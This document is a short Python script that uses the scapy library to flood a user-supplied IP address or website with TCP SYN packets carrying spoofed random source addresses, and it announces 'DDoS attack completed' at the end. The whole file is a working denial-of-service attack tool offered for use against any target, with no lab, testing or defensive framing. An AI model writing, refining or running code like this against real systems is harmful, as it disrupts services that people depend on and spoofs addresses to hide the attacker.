from scapy.all import *
import random

def perform_ddos(target_ip, num_packets, packet_size):
    # Create a packet with a spoofed source IP address
    packet = IP(src=RandIP(), dst=target_ip) / TCP(dport=random.randint(1, 65535), flags="S")
    packet /= Raw(b"A" * packet_size)  # Add payload of specified size

    # Send the packets to the target IP address
    send(packet, count=num_packets, inter=0.001, verbose=0)

# Main program
target_ip = input("Enter the target IP address or website: ")
num_packets = int(input("Enter the number of packets to send: "))
packet_size = int(input("Enter the packet size (in bytes): "))

print(f"Sending {num_packets} packets of size {packet_size} bytes to {target_ip}...")
for _ in range(num_packets):
    perform_ddos(target_ip, 1, packet_size)

print("DDoS attack completed.")